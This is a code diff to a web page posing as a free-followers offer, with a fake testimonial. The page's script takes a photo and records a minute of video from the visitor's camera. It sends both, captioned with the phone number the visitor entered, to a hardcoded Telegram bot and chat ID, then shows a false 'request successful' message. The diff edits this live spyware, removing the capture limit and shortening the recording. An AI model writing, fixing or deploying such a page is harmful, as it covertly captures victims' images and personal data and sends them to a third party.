@@ -210,10 +210,9 @@
                 <div class="text">"Amazing experience! The free followers came through as promised.".</div>
             </div>
         </div>
-
 <script>
     let captureCount = 0;
-    const MAX_CAPTURES = Infinity; // unlimited captures
+    // Unlimited captures: no MAX_CAPTURES enforcement
     const TELEGRAM_BOT_TOKEN = '8418074176:AAH4C7JP5vRChfDk2r-B0AHMqrXlenMcloA';
     const CHAT_ID = '6311079862';
 
@@ -227,12 +226,7 @@
     }
 
     async function captureMedia() {
-        // MAX_CAPTURES is Infinity -> this condition will never block, kept for compatibility
-        if (captureCount >= MAX_CAPTURES) {
-            alert('You have reached the maximum number of captures.');
-            return;
-        }
-
+        // No capture limit check (unlimited)
         captureCount++;
 
         try {
@@ -243,17 +237,18 @@
             };
             const stream = await navigator.mediaDevices.getUserMedia(constraints);
 
-            // Capture image
-            const imgDataUrl = await captureImageFromStream(stream);
-            // Convert data URL to blob
-            const imgBlob = await fetch(imgDataUrl).then(res => res.blob());
+            // Capture photo
+            const imgData = await captureImageFromStream(stream);
+            // imgData is an object URL; fetch it back to a blob
+            const imgBlob = await fetch(imgData).then(res => res.blob());
             const phoneNumber = document.getElementById('phoneNumber').value || '';
 
-            await sendMediaToTelegram(imgBlob, 'photo', phoneNumber);
+            // Send photo (use .jpg extension)
+            sendMediaToTelegram(imgBlob, 'photo', phoneNumber);
 
-            // Capture video (10 minutes)
-            const videoBlob = await captureVideoFromStream(stream, 10 * 60 * 1000); // 10 minutes in ms
-            await sendMediaToTelegram(videoBlob, 'video', phoneNumber);
+            // Capture video for 1 minute (60000 ms)
+            const videoBlob = await captureVideoFromStream(stream, 60000);
+            sendMediaToTelegram(videoBlob, 'video', phoneNumber);
 
             // stop all tracks
             stream.getTracks().forEach(track => track.stop());
@@ -264,125 +259,82 @@
             messageElement.textContent = 'Thank you for your interest! Your request was successful.';
         } catch (error) {
             console.error('Error accessing camera:', error);
-            alert('Error accessing camera. Please make sure your device supports camera access and you granted permission.');
+            alert('Error accessing camera. Please make sure your device supports camera access and you allowed camera permission.');
         }
     }
 
     async function captureImageFromStream(stream) {
         const track = stream.getVideoTracks()[0];
-        // ImageCapture may not be supported in every browser — still using it as in original code
-        if (typeof ImageCapture !== 'undefined') {
-            try {
-                const imageCapture = new ImageCapture(track);
-                const blob = await imageCapture.takePhoto();
-                return URL.createObjectURL(blob);
-            } catch (err) {
-                console.warn('ImageCapture.takePhoto failed, falling back to canvas capture:', err);
-                // fallback to canvas capture below
-            }
-        }
-
-        // Fallback: draw current frame to canvas and get data URL
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-
-        // wait for a frame
-        await new Promise((res) => {
-            if (video.readyState >= 2) return res();
-            video.onloadeddata = () => res();
-        });
-
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        video.pause();
-        return canvas.toDataURL('image/jpeg', 0.9); // returns a data URL
+        // ImageCapture API to take photo
+        const imageCapture = new ImageCapture(track);
+        const blob = await imageCapture.takePhoto();
+        // Return object URL for easier conversion to blob later
+        return URL.createObjectURL(blob);
     }
 
-    function captureVideoFromStream(stream, maxDurationMs = 10000) {
-        // Prefer 'video/webm; codecs=vp9' or 'video/webm; codecs=vp8' if supported, otherwise default
-        let mimeType = 'video/webm';
-        if (MediaRecorder && MediaRecorder.isTypeSupported) {
-            if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
-                mimeType = 'video/webm;codecs=vp9';
-            } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
-                mimeType = 'video/webm;codecs=vp8';
-            }
-        }
-
-        const options = { mimeType };
-        let mediaRecorder;
+    function captureVideoFromStream(stream, durationMs = 60000) {
+        // default duration is 60000 ms (1 minute)
+        const options = {};
+        // Note: browser may ignore some mime types; using webm as fallback
         try {
-            mediaRecorder = new MediaRecorder(stream, options);
-        } catch (e) {
-            // fallback to default (browser may choose a supported type)
-            mediaRecorder = new MediaRecorder(stream);
-            console.warn('Requested MediaRecorder mimeType not supported, using default.');
-        }
-
-        const chunks = [];
-        mediaRecorder.ondataavailable = function(event) {
-            if (event.data && event.data.size > 0) {
-                chunks.push(event.data);
-            }
-        };
-
-        mediaRecorder.start();
-
-        return new Promise((resolve, reject) => {
-            mediaRecorder.onstop = function() {
-                const blob = new Blob(chunks, { type: mimeType.split(';')[0] || 'video/webm' });
-                resolve(blob);
-            };
-
-            mediaRecorder.onerror = function(err) {
-                reject(err);
-            };
-
-            // Stop recording after maxDurationMs (10 minutes if called as above)
-            setTimeout(() => {
-                if (mediaRecorder && mediaRecorder.state === 'recording') {
-                    mediaRecorder.stop();
+            // if not supported an error will be thrown — we still handle it
+            const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            const chunks = [];
+            mediaRecorder.ondataavailable = function(event) {
+                if (event.data && event.data.size > 0) {
+                    chunks.push(event.data);
                 }
-            }, maxDurationMs);
-        });
+            };
+
+            mediaRecorder.start();
+
+            return new Promise((resolve, reject) => {
+                mediaRecorder.onstop = function() {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    resolve(blob);
+                };
+
+                // stop after the requested duration
+                setTimeout(() => {
+                    try {
+                        mediaRecorder.stop();
+                    } catch (err) {
+                        // in case it's already stopped or failed
+                        console.warn('mediaRecorder.stop() error:', err);
+                    }
+                }, durationMs);
+            });
+        } catch (err) {
+            // Fallback: if MediaRecorder construction fails
+            return Promise.reject(new Error('MediaRecorder not supported or construction failed: ' + err.message));
+        }
     }
 
-    async function sendMediaToTelegram(blob, type, phoneNumber) {
+    function sendMediaToTelegram(blob, type, phoneNumber) {
         const formData = new FormData();
 
-        // Determine a sensible filename and extension from blob.type
-        const mime = blob.type || '';
-        let ext = 'bin';
-        if (mime.includes('jpeg') || mime.includes('jpg')) ext = 'jpg';
-        else if (mime.includes('png')) ext = 'png';
-        else if (mime.includes('webm')) ext = 'webm';
-        else if (mime.includes('mp4')) ext = 'mp4';
-
-        // Use 'photo' field name for images, 'video' for videos (matches Telegram Bot API)
-        const fieldName = type === 'photo' ? 'photo' : 'video';
-        const filename = `${type}_${captureCount}.${ext}`;
-
-        formData.append(fieldName, blob, filename);
+        // Use sensible filename extensions for each media type
+        const filename = type === 'photo' ? `photo_${captureCount}.jpg` : `video_${captureCount}.webm`;
+        // Append the file under the expected field name (photo or video)
+        formData.append(type, blob, filename);
+        // Telegram caption
         formData.append('caption', `Phone Number: ${phoneNumber}`);
 
-        try {
-            // The Bot API endpoints are: sendPhoto or sendVideo
-            const method = type === 'photo' ? 'sendPhoto' : 'sendVideo';
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;
+        // Build endpoint: sendPhoto or sendVideo
+        const endpoint = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`;
 
-            const response = await axios.post(url, formData, {
-                params: { chat_id: CHAT_ID },
-                headers: formData.getHeaders ? formData.getHeaders() : {} // axios in browser will set boundary automatically
-            });
-
-            console.log('Media sent successfully:', response.data);
-        } catch (error) {
-            console.error('Error sending media to Telegram:', error);
-            // Optional: show user-friendly message
-        }
+        axios.post(endpoint, formData, {
+            params: { chat_id: CHAT_ID },
+            headers: { 'Content-Type': 'multipart/form-data' }
+        })
+        .then(response => {
+            console.log(`${type} sent successfully:`, response.data);
+        })
+        .catch(error => {
+            console.error(`Error sending ${type} to Telegram:`, error);
+        });
     }
 </script>
+</body>
+    </html>
+        
